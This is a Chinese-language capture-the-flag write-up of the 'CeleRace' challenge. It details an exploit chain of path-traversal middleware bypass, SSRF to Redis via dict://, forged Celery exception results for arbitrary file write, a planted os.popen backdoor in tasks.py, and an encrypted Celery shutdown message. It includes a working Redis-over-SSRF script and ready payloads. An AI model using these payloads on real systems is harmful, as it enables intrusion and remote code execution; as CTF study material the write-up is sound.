# CeleRace

## Dockerfile

从 Dockerfile 我们可以看到如下语句：

```dockerfile
chown root:worker /readflag
```

从这里我们可以明确本题的目标，就是要实现RCE通过`/readflag`来获取 flag ，`/readflag`要通过 root 用户或 worker 用户组的用户调用。

```shell
useradd --system --home /app --no-create-home --shell /usr/sbin/nologin --gid worker --groups app worker
```

有用户 worker 属于 worker 用户组，可以调用`/readflag`拿到 flag。

## supervisord

在`supervisord.conf`中我们可以看到主要启动了三个服务，内容如下：

```shell
[supervisord]
nodaemon=true

[program:redis]
command=/usr/bin/redis-server /app/docker/redis.conf
directory=/app
autostart=true
autorestart=true
redirect_stderr=true
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stdout_logfile_backups=0
user=redis

[program:web]
command=python -m src.app
directory=/app
autostart=true
autorestart=true
redirect_stderr=true
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stdout_logfile_backups=0
user=web

[program:worker]
command=celery -A src.tasks:celery_app worker --loglevel=info
directory=/app
autostart=true
autorestart=true
redirect_stderr=true
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stdout_logfile_backups=0
user=worker
```

在这里我们可以看到有三个服务，分别是`worker`、`redis`、`web`，其中`worker`服务所属用户是worker，所以我们主要目标就是要通过这个服务下手。

## 软件功能及源码阅读

接下来我们进行软件的基本功能了解和源码分析

### 软件功能

打开web界面，我们通过软件界面可以发现软件主要实现了两大部分功能：

1. 用户管理
2. 执行制定 tasks 和 tasks 结果查询 

其中 fetch tasks 可以 ssrf 到 redis 服务上，实现 redis 的控制，但是 fetch tasks 需要 admin 权限，才能执行。

### 源码分析

现在的目标就是首先拿到 admin 的权限，之后执行 redis 命令。

在源码中，对于`/tasks/fetch`路径，我们引入了`require_admin`中间件，来实现对于当前路径请求后的用户权限管理。

#### 任意文件创建

在该项目中，我们查看 cookie 可以查看到有一个`mini_session`，其中核心处理逻辑在如下文件中：`/frameword/session.py`。

首先系统对于 session 的处理逻辑如下，首先在账号相关管理中，都会调用`save_session`方法，该方法位于`/framework/app.py`中：

````python
def save_session() -> None:
    ctx = _request_ctx_stack.top
    if ctx is None or ctx.session is None:
        raise RuntimeError("No session bound to current context")
    ctx.session.save()
````

我们可以跟随逻辑可以找到`session`相关对象为`/framework/session.py`中的`FileSession`所定义，其中`session`的内容由`FileSessionManager`类管理，我们进一步阅读`FileSessionManager`对于`session`的管理逻辑。



首先在`/src/app.py`中我们可以读到，当我们需要注册登陆登出时候，系统都会给我们一个对应的`cookie`来区分不同用户种类。

其中我们可以看到我们实际上 cookie 的值实际上是一个 sid，在`FileSessionManager`的处理逻辑中，系统会将对应 sid 的值存入同名文件中，其中默认路径为`/tmp/sess`我们可以在下面的方法中看到：

```python
class FileSessionManager:
    """Manage loading and storing of file-based sessions."""

    def __init__(self, secret: str = "devsecret", directory: str = "/tmp/sess", cookie_name: str = "mini_session", nonce_bytes: int = 8) -> None:
        self.secret = secret.encode() if isinstance(secret, str) else secret
        self.directory = directory
        self.cookie_name = cookie_name
        self.nonce_bytes = nonce_bytes
        os.makedirs(self.directory, exist_ok=True)
```

之后在`save_session方法中的ctx.session.save`方法我们可以定位到`FileSessionManager`类中的如下方法：

```python
def save(self, session: FileSession) -> None:
    if not session.modified:
        return
    path = self._session_path(session.sid)
    tmp_path = f"{path}.tmp-{secrets.token_hex(4)}"
    payload = {key: value for key, value in session.items()}
    with open(tmp_path, "w", encoding="utf-8") as fh:
        json.dump(payload, fh, ensure_ascii=False, separators=(",", ":"))
    os.replace(tmp_path, path)
    session.modified = False
```

其中存储路径的数值和`_session_path`有关，相关处理逻辑如下：

```python
def _session_path(self, sid: str) -> str:
    return os.path.join(self.directory, f"{sid}")
```

该方法将 sid 直接直接和 session 默认存储文件夹路径进行拼接，并且在源代码中没有 sid 有效性检验相关逻辑，如果我们可以控制 sid 的数值，那么我们就可以实现任意文件创建。

#### 权限绕过及ssrf实现redis命令执行

之后我们通过查看本地 session 的值，可以看到 session 内容如下：

```python
{"user":"qwqwqwq","role":"user"}
```

所以提权的思路分为以下两个思路:

1. 通过读写操作实现 session 数值的修改
2. 通过其他方法绕过中间件的权限检验

在源代码中暂时没有找到相关读写逻辑，但是中间件匹配逻辑中可以找到绕过方法。

中间件和路径匹配主要由下面方法处理：

```python
def _collect_route_middlewares(self, endpoint: str, path: str) -> list[MiddlewareCallable]:
    scoped = list(self.route_middlewares.get(endpoint, []))
    if scoped:
        return scoped
    if not self.wildcard_middlewares:
        return scoped
    normalized_path = self._normalize_path(path)
    for pattern, middlewares in reversed(self.wildcard_middlewares):
        if self._pattern_matches(pattern, normalized_path):
            return list(middlewares)
    return scoped
```

在上面的方法中，我们观察逻辑可以发现，首先调用了`_normalize_path`方法，之后按照处理后的路径进行中间件的匹配。

我们阅读`_normalize_path`的逻辑：

```python
def _normalize_path(self, path: str) -> str:
    if not path:
        return "/"
    try:
        decoded = unquote(path)
    except Exception:  # pragma: no cover - defensive only
        decoded = path
    trailing_slash = decoded.endswith("/") and decoded != "/"
    normalized = posixpath.normpath(decoded) or "/"
    if trailing_slash and normalized != "/":
        normalized = normalized.rstrip("/") + "/"
    if not normalized.startswith("/"):
        normalized = "/" + normalized
    return normalized
```

首先通过`unquote`进行解码，之后通过`posixpath.normpath`对路径进行标准化，这里如果访问路径`/tasks/fetch/%2e%2e/a`路径，在上面的函数中会被处理为`/tasks/a`，之后回到上面的中间件相关方法中，由于路径并不匹配，所以绕过了上面定义的`require_admin`中间件的权限验证实现越权。

发送下面的数据包

```python
# https://blog.potatowo.top/2025/10/20/%E5%BC%BA%E7%BD%91%E6%9D%AF2025%E7%BA%BF%E4%B8%8A%E5%88%9D%E8%B5%9Bwp/
import json
import requests

URL = "https://127.0.0.1:5001"

def to_resp(command_line: str) -> str:
    args = command_line.strip().split()
    resp = f"*{len(args)}\r\n"
    for arg in args:
        resp += f"${len(arg)}\r\n{arg}\r\n"
    return resp + "\r\n\r\n\r\n\r\n*3"

def exp(verb):
    # print(verb)
    r = requests.post(
        url=URL+ "/tasks/fetch/%2e%2e%2f%61",
        json={
            "url": "dict://127.0.0.1:6379/",
            "verb": verb
        }
    )
    task_id = r.json().get('task_id')
    # print(task_id)
    r = requests.get(
        url=URL+ "/tasks/result",
        params={
            "id": task_id
        }
    )
    res = r.json().get('result').get('preview')
    return res

if __name__ == "__main__":
    while True:
        cmd = input("redis-cli> ")
        if cmd.lower() in ('exit', 'quit'):
            break
        resp_str = to_resp(cmd)
        res = exp(resp_str)
        print(res)
```

上面为 redis 的利用脚本，可以执行 redis 命令。

#### 任意文件写入

在`/framework/app.py`中我们可以找到一个类`DiagnosticsPersistError`,其中的方法`_maybe_persist`实现了文件写操作，并且可以通过payload制定写入文件的路径和内容，我们可以通过实例化该类实现任意写操作。

```python
class DiagnosticsPersistError(RuntimeError):
    """Dormant exception used for development-time diagnostics persistence."""

    _BASE_DIR = Path(os.environ.get("FRAMEWORK_DIAGNOSTICS_DIR", "/app/data")).resolve()
    _DEBUG_SENTINEL = Path("/tmp/debug")

    def __init__(self, payload: str, *args: Any, **kwargs: Any) -> None:
        if self._DEBUG_SENTINEL.exists():
            self._maybe_persist(payload)
        super().__init__("diagnostics capture failed", *args, **kwargs)
```

其中初始化中就调用了`_maybe_persist`，但是需要`/tmp/debug`文件存在，该问题我们可以通过上面的任意文件创建实现，现在的文件就是要如何实例化当前类。

该系统通过`celery`实现了 tasks 的异步执行和结果查看功能，但是 celery 存在一个 CVE 可以实现 RCE，但是该漏洞在`5.2.2`版本就被修复了，当前系统使用的版本为`5.3.6`，没有办法直接实现 RCE。

https://security.snyk.io/vuln/SNYK-PYTHON-CELERY-2314953

但是该漏洞的修复方法为限制实例化的对象范围，将可以实例化所有对象修改为只能实例化继承于`Exception`的类，恰好`DiagnosticsPersistError`继承`RuntimeError`,`RuntimeError`集成`Exception`，符合可以被实例化的条件。

其中实例化当前类的条件为可以任意修改 redis 中的值，这一条件我们通过权限绕过和 ssrf 进行了实现。

接下来我们就是了解实例化的详细逻辑，并且进行利用。

在上面连接中，payload 内容如下：

```json
{
'status': 'FAILURE',
'result': json.dumps({
  'exc_module': 'os',
  'exc_type': 'system',
  'exc_message': 'id'
  })
}
```

在当前系统中，celery 将内容存入 redis，我们查看内容如下：

```json
{
    "status": "SUCCESS",
    "result": {
        "echo": "123123"
    },
    "traceback": null,
    "children": [

    ],
    "date_done": "2025-11-10T08:54:02.435989",
    "task_id": "42554953-c9cd-44b4-8017-fe6256498582"
}
```

按照上面的思路，我们可以通过 redis 修改指定 task 的结果，构造恶意 payload 实现调用`DiagnosticsPersistError`进而实现任意写。

#### 重启celery服务

通过上面的任意写操作，我们就可以修改 `task.py`的源代码，嵌入恶意代码实现 RCE。

我选择修改`miniws.echo`使其直接读取并输出 flag 内容：

```python
@celery_app.task(name="miniws.echo")
def echo_task(message: str) -> Dict[str, Any]:
    return {"echo": __import__("os").popen(message).read()}
```

其中 celery 服务由 supervisord 维持，所以我们只需要关闭 celery 服务就可以实现 celery 的重启。

celery 的消息中间件 Broker 可以通过 redis 的 PUB/SUB 发布并执行命令，所以我们现在可以通过该方法，实现 celery的重启。

Broker 和 redis 之间的通信通过 kombu 模块实现，但是该本题对传输的 body 进行了加密，其中加密算法相关在`/src/crypto.py`中实现。

由于 KEY 和 NONCE 固定，所以可以计算出密钥流。

```python
_TASK_KEY = sha1(settings.secret_key.encode()).digest()[:16]
_TASK_NONCE = md5(socket.gethostname().encode()).digest()[:8]
```

我们可以通过 ，我们执行如下 redis 命令，获取 Broker 的传输内容，进一步获取到加密的 body。

```shell
LRANGE celery 0 0
```

返回如下

```shell
127.0.0.1:6379> lrange celery 0 0
1) "{\"body\": \"QjPKTWsjxr7CEJ/yeT84esVrf8/1gxzY1ZLhQ90qjuR7lo/woRf1smsKoaNVdeqjvXkICIWwoCGvFDFuf8KNEF416pGtDb+TO1XGTwgnnKq3Rr+ZGkF4mwBARxt30fMEcG0LNX1rT7EekgUHwo60KIIQPwoauizLopQajLtPYUl4kpgZkRzs7kVoGh0=\", \"content-encoding\": \"binary\", \"content-type\": \"application/x-miniws\", \"headers\": {\"lang\": \"py\", \"task\": \"miniws.echo\", \"id\": \"c88a4d3d-9854-4f19-a979-241e67986dd7\", \"shadow\": null, \"eta\": null, \"expires\": null, \"group\": null, \"group_index\": null, \"retries\": 0, \"timelimit\": [null, null], \"root_id\": \"c88a4d3d-9854-4f19-a979-241e67986dd7\", \"parent_id\": null, \"argsrepr\": \"()\", \"kwargsrepr\": \"{'message': 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'}\", \"origin\": \"gen14@celerace\", \"ignore_result\": false, \"replaced_task_nesting\": 0, \"stamped_headers\": null, \"stamps\": {}}, \"properties\": {\"correlation_id\": \"c88a4d3d-9854-4f19-a979-241e67986dd7\", \"reply_to\": \"5d4c36a8-3215-3828-91c1-4582985c0372\", \"delivery_mode\": 2, \"delivery_info\": {\"exchange\": \"\", \"routing_key\": \"celery\"}, \"priority\": 0, \"body_encoding\": \"base64\", \"delivery_tag\": \"cd147f8d-bd85-487a-9412-3d20473e9f61\"}}"
```

其中我们拿到了加密的 body 之后就可以通过已知明文来获取 key stream。

> [!NOTE]
>
> 这里要注意，在后续如果想要加密一个很长的内容时候，我们已知明文要长一点，来确保有足够的 key stream 供后续加密使用，感觉 zhoumo 的帮助喵😭。

之后我们拿到 key stream 之后就可以对关机相关 payload 加密：

```shell
# Payload
{"method":"shutdown","arguments":{}}
# Full Payload
PUBLISH /0.celery.pidbox '{"body": "Ykr6BGRpxL+TWdzmdGh2PMt9cIy4wBzL04btR9I/nKcgjJPs", "content-encoding": "binary", "content-type": "application/x-miniws", "headers": {"clock": 1, "expires": 1861891032.9756505}, "properties": {"delivery_mode": 2, "delivery_info": {"exchange": "celery.pidbox", "routing_key": ""}, "priority": 0, "body_encoding": "base64", "delivery_tag": "e9cb2a03-3968-4a48-a3ea-ca7ba413c012"}}'
```

其中 body 为`{"method":"shutdown","arguments":{}}`加密之后的 base64 加密的结果。

我们通过 Redis 发送该 payload 就会关闭 celery 服务，但是 supervisord 重新拉起 celery 服务之后就会重新加载修改过的 `tasks.py`，之后我们就可以通过`miniws.echo`实现 RCE 获取到 flag。

## 参考博客

参考下面两位大佬的博客进行了复现，其中`dos.py`和修改后的`tasks.py`来自 zoiltin 师傅，`redis.py`来自 Potat0w0 师傅。

https://zoiltin.github.io/posts/%E5%BC%BA%E7%BD%91%E6%9D%AF2025-celerace-writeup/

https://blog.potatowo.top/2025/10/20/%E5%BC%BA%E7%BD%91%E6%9D%AF2025%E7%BA%BF%E4%B8%8A%E5%88%9D%E8%B5%9Bwp/
